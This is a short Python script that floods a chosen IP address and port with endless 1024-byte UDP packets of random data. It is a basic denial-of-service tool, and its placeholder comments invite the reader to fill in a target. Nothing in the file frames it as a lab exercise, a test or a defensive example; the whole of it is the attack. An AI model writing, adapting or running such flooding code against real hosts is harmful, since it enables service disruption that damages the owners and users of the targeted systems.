import socket
import random

target_ip = "192.168.0.1"  # Replace with the target IP address
target_port = 80  # Replace with the target port

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random data for the payload
payload = random._urandom(1024)

# Send the payload to the target IP and port
while True:
    sock.sendto(payload, (target_ip, target_port))
